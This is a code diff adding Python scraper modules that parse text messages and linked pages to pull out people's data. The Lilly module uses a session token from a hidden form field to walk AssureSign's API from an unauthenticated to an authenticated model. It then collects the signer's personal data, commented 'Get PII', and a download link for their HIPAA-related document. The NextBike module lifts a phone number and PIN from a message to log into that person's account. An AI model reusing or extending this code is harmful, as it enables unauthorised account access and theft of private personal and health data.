@@ -210,3 +210,100 @@ class SuitsMeCard(DataModule):
 
     def _retrieve_data_in_msg(self, msg):
         return {"data":msg.split('.')[0].replace('Hi ')}
+
+class Booksy(DataModule):
+    def __init__(self):
+        name        = 'Boosky'
+        base_url    = 'https://boosky.com/'
+        super().__init__(name, base_url)
+
+    def retrieve_data(self, url, msg):
+        # try:
+        # Init
+        data = {}
+        regex = r"window\.top\.location.*;"
+        # Send request and parse
+        resp = requests.get(url, allow_redirects=False)
+        line = re.search(regex, resp.text).group(0)
+        line = line.replace('windows.top.location = ', '')
+        line = line.replace('validateProtocol', '')
+        line = line.replace('("', '')
+        line = line.replace('");', '')
+        params = line.split('?')[1]
+        # Handle params
+        for param in params.split('&'):
+            key = param.split('=')[0]
+            val = param.split('=')[1]
+            data[key] = val
+        
+        json_data = json.dumps(data, ensure_ascii=False)
+        return json_data
+        # except:
+        #     return {"Data":"Error"}
+
+class Lilly(DataModule):
+    def __init__(self):
+        name        = 'Lilly'
+        base_url    = 'https://e.lilly/'
+        super().__init__(name, base_url)
+
+    def retrieve_data(self, url, msg):
+        data = {}
+
+        if 'HIPAA' in msg:
+            # Request 1 - Get session information
+            resp = requests.get(url, allow_redirects=True)
+            # Parse
+            soup        = BeautifulSoup(resp.text, features="lxml")
+            hidden_tags = soup.find("input", type="hidden")
+            raw_data    = hidden_tags.get('value')
+            jsondata    = json.loads(raw_data)
+            session_token = json.loads(jsondata['sessionToken'])
+            # Get data
+            session_token   = json.dumps(session_token)
+            document_id     = jsondata['documentId']
+            signatory_id    = jsondata['signatoryId']
+
+            # Request 2 - Deauthenticate
+            url     = "https://www.assuresign.net/api/signing/v1/unauthenticatedModel/" + signatory_id + "?bypassLanding=false&suppressHeader=false&redirectUrl="
+            headers = {'Authorization': 'SigningSessionToken ' + str(session_token), 'SigningSmsAuthExpiration':'SigningSmsAuthExpirationToken', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0', 'X-Requested-With':'XMLHttpRequest'}
+            r       = requests.get(url, headers=headers)
+            session_token = r.headers['SigningSessionToken']
+
+            # Request 3 - Authenticate and get PII
+            url     = "https://www.assuresign.net/api/signing/v1/authenticatedModel/" + signatory_id
+            headers = {'Authorization': 'SigningSessionToken ' + str(session_token), 'SigningSmsAuthExpiration':'SigningSmsAuthExpirationToken', 'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 OPR/102.0.0.0', 'X-Requested-With':'XMLHttpRequest'}
+            r       = requests.get(url, headers=headers)
+            session = json.loads(r.text)['session']
+
+            # Request 4 - Get document download token
+            url     = "https://www.assuresign.net/api/signing/v1/downloadToken/document/" + document_id
+            r       = requests.get(url, headers=headers)
+            token   = json.loads(r.text)['downloadToken']
+
+            # Data
+            data = session
+            data.pop('initialFontPreviewImages', None)
+            data['documentURL'] = "https://www.assuresign.net/ui/download/document/" + document_id + "/final?downloadToken=" +  token
+            json_data = json.dumps(data, ensure_ascii=False)
+            return json_data
+        else:
+            return {"Data":"None"} 
+        
+class NextBike(DataModule):
+    def __init__(self):
+        name        = 'NextBike'
+        base_url    = 'https://www.nextbike.de/'
+        super().__init__(name, base_url)
+
+    def retrieve_data(self, url, msg):
+        data = {}
+        data['login_page']  = 'https://www.nextbike.de/en/account/login'
+        data['login']       = re.search(phone_regex, msg).group(0).replace(' ','')
+        data['password']    = re.search(pin_regex, msg).group(0).replace('PIN: ','').replace('.','')
+        
+        json_data = json.dumps(data, ensure_ascii=False)
+        return json_data
+
+
+
